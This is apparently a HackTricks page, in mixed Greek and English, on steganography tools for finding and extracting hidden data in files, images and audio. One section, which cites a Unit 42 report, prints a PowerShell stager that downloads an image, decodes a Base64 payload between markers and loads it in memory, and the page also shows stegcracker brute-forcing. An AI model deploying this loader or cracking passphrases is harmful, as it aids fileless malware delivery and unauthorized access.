# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Εξαγωγή Δεδομένων από Αρχεία**

### **Binwalk**

Ένα εργαλείο για την αναζήτηση σε δυαδικά αρχεία για ενσωματωμένα κρυφά αρχεία και δεδομένα. Εγκαθίσταται μέσω `apt` και ο πηγαίος κώδικας είναι διαθέσιμος στο [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Ανακτά αρχεία βάσει των κεφαλίδων και των υποσέλιδων τους, χρήσιμο για εικόνες png. Εγκαθίσταται μέσω `apt` με τον κώδικά του στο [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Βοηθά στην προβολή των μεταδεδομένων αρχείων, διαθέσιμο [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Παρόμοιο με το exiftool, για προβολή μεταδεδομένων. Εγκαταστάσιμο μέσω `apt`, ο πηγαίος κώδικας στο [GitHub](https://github.com/Exiv2/exiv2), και διαθέτει έναν [επίσημο ιστότοπο](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Προσδιορίστε τον τύπο αρχείου με τον οποίο έχετε να κάνετε.

### **Strings**

Εξάγει αναγνώσιμα strings από αρχεία, χρησιμοποιώντας διάφορες ρυθμίσεις κωδικοποίησης για να φιλτράρει την έξοδο.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Σύγκριση (cmp)**

Χρήσιμο για τη σύγκριση ενός τροποποιημένου αρχείου με την αρχική του έκδοση που βρέθηκε στο διαδίκτυο.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Εξαγωγή κρυφών δεδομένων σε κείμενο**

### **Κρυφά Δεδομένα στα Κενά**

Αόρατοι χαρακτήρες σε φαινομενικά κενά διαστήματα μπορεί να κρύβουν πληροφορίες. Για να εξαγάγετε αυτά τα δεδομένα, επισκεφθείτε [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Εξαγωγή δεδομένων από εικόνες**

### **Εντοπισμός λεπτομερειών εικόνας με GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) χρησιμεύει για να προσδιορίσει τον τύπο αρχείου εικόνας και να εντοπίσει πιθανή φθορά. Εκτελέστε την παρακάτω εντολή για να ελέγξετε μια εικόνα:
```bash
./magick identify -verbose stego.jpg
```
Για να προσπαθήσετε την επισκευή μιας κατεστραμμένης εικόνας, η προσθήκη ενός metadata comment μπορεί να βοηθήσει:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide για Απόκρυψη Δεδομένων**

Steghide διευκολύνει την απόκρυψη δεδομένων μέσα σε `JPEG, BMP, WAV, and AU` αρχεία, ικανό να ενσωματώνει και να εξάγει κρυπτογραφημένα δεδομένα. Η εγκατάσταση είναι απλή με `apt`, και ο πηγαίος κώδικας είναι διαθέσιμος στο GitHub: [https://github.com/StefanoDeVuono/steghide](https://github.com/StefanoDeVuono/steghide).

**Εντολές:**

- `steghide info file` αποκαλύπτει εάν ένα αρχείο περιέχει κρυμμένα δεδομένα.
- `steghide extract -sf file [--passphrase password]` εξάγει τα κρυμμένα δεδομένα, ο κωδικός πρόσβασης προαιρετικός.

Για εξαγωγή μέσω web, επισκεφθείτε [αυτόν τον ιστότοπο](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- To attempt password cracking on Steghide, use [stegcracker](https://github.com/Paradoxis/StegCracker.git) as follows:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg για αρχεία PNG και BMP**

Το zsteg εξειδικεύεται στην αποκάλυψη κρυφών δεδομένων σε αρχεία PNG και BMP. Η εγκατάσταση γίνεται με `gem install zsteg`, με τον [πηγαίο κώδικα στο GitHub](https://github.com/zed-0xff/zsteg).

**Εντολές:**

- `zsteg -a file` εφαρμόζει όλες τις μεθόδους ανίχνευσης σε ένα αρχείο.
- `zsteg -E file` καθορίζει ένα payload για εξαγωγή δεδομένων.

### **StegoVeritas και Stegsolve**

**stegoVeritas** ελέγχει τα μεταδεδομένα, εκτελεί μετασχηματισμούς εικόνας και εφαρμόζει LSB brute forcing μεταξύ άλλων λειτουργιών. Χρησιμοποιήστε `stegoveritas.py -h` για πλήρη λίστα επιλογών και `stegoveritas.py stego.jpg` για εκτέλεση όλων των ελέγχων.

**Stegsolve** εφαρμόζει διάφορα φίλτρα χρωμάτων για να αποκαλύψει κρυμμένα κείμενα ή μηνύματα μέσα σε εικόνες. Είναι διαθέσιμο στο [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT για Ανίχνευση Κρυφού Περιεχομένου**

Οι τεχνικές Fast Fourier Transform (FFT) μπορούν να αποκαλύψουν κρυμμένο περιεχόμενο σε εικόνες. Χρήσιμες πηγές περιλαμβάνουν:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy για αρχεία ήχου και εικόνας**

Το Stegpy επιτρέπει την ενσωμάτωση πληροφοριών σε αρχεία εικόνας και ήχου, υποστηρίζοντας μορφές όπως PNG, BMP, GIF, WebP και WAV. Είναι διαθέσιμο στο [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck για ανάλυση αρχείων PNG**

Για ανάλυση αρχείων PNG ή για επικύρωση της αυθεντικότητάς τους, χρησιμοποιήστε:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Πρόσθετα Εργαλεία για Ανάλυση Εικόνων**

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Base64 payloads οριοθετημένα με marker και κρυμμένα σε εικόνες (malware delivery)

Τα commodity loaders όλο και περισσότερο κρύβουν Base64-encoded payloads ως απλό κείμενο μέσα σε κατά τα άλλα έγκυρες εικόνες (συχνά GIF/PNG). Αντί για pixel-level LSB, το payload οριοθετείται από μοναδικά start/end marker strings ενσωματωμένα στο κείμενο/metadata του αρχείου. Ένας PowerShell stager στη συνέχεια:
- Κατεβάζει την εικόνα μέσω HTTP(S)
- Εντοπίζει τα marker strings (παρατηρημένα παραδείγματα: <<sudo_png>> … <<sudo_odt>>)
- Εξάγει το κείμενο μεταξύ των markers και το αποκωδικοποιεί από Base64 σε bytes
- Φορτώνει το .NET assembly στη μνήμη και καλεί μια γνωστή μέθοδο εισόδου (δεν γράφεται κανένα αρχείο στο δίσκο)

Ελάχιστο PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Σημειώσεις
- Αυτό εμπίπτει στο ATT&CK T1027.003 (steganography). Οι συμβολοσειρές δεικτών ποικίλλουν ανάμεσα σε καμπάνιες.
- Hunting: σαρώστε τις ληφθείσες εικόνες για γνωστούς διαχωριστές· επισημάνετε `PowerShell` που χρησιμοποιεί `DownloadString` ακολουθούμενο από `FromBase64String`.

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Εξαγωγή Δεδομένων από Αρχεία Ήχου**

**Audio steganography** offers a unique method to conceal information within sound files. Different tools are utilized for embedding or retrieving hidden content.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide is a versatile tool designed for hiding data in JPEG, BMP, WAV, and AU files. Λεπτομερείς οδηγίες παρέχονται στην [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Αυτό το εργαλείο είναι συμβατό με διάφορες μορφές, συμπεριλαμβανομένων των PNG, BMP, GIF, WebP και WAV. Για περισσότερες πληροφορίες, ανατρέξτε στην [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

Το ffmpeg είναι κρίσιμο για την αξιολόγηση της ακεραιότητας των αρχείων ήχου, παρέχοντας λεπτομερείς πληροφορίες και εντοπίζοντας τυχόν αποκλίσεις.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

Το WavSteg ξεχωρίζει στην απόκρυψη και εξαγωγή δεδομένων μέσα σε αρχεία WAV χρησιμοποιώντας την least significant bit strategy. Διατίθεται στο [GitHub](https://github.com/ragibson/Steganography#WavSteg). Οι εντολές περιλαμβάνουν:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Το Deepsound επιτρέπει την κρυπτογράφηση και ανίχνευση πληροφοριών μέσα σε αρχεία ήχου χρησιμοποιώντας AES-256. Μπορεί να ληφθεί από [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Ένα πολύτιμο εργαλείο για οπτική και αναλυτική επιθεώρηση αρχείων ήχου, το Sonic Visualizer μπορεί να αποκαλύψει κρυφά στοιχεία που δεν ανιχνεύονται με άλλους τρόπους. Επισκεφτείτε την [official website](https://www.sonicvisualiser.org/) για περισσότερα.

### **DTMF Tones - Dial Tones**

Η ανίχνευση DTMF τόνων σε αρχεία ήχου μπορεί να γίνει μέσω διαδικτυακών εργαλείων όπως [this DTMF detector](https://unframework.github.io/dtmf-detect/) και [DialABC](http://dialabc.com/sound/detect/index.html).

## **Άλλες Τεχνικές**

### **Binary Length SQRT - QR Code**

Δυαδικά δεδομένα των οποίων το μήκος έχει ακέραια τετραγωνική ρίζα μπορεί να αντιστοιχούν σε QR code. Χρησιμοποιήστε αυτό το απόσπασμα κώδικα για να ελέγξετε:
```python
import math
math.sqrt(2500) #50
```
Για μετατροπή από binary σε εικόνα, δείτε [dcode](https://www.dcode.fr/binary-image). Για ανάγνωση QR codes, χρησιμοποιήστε [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Μετάφραση Braille**

Για μετάφραση Braille, ο [Branah Braille Translator](https://www.branah.com/braille-translator) είναι εξαιρετική πηγή.

## **Αναφορές**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
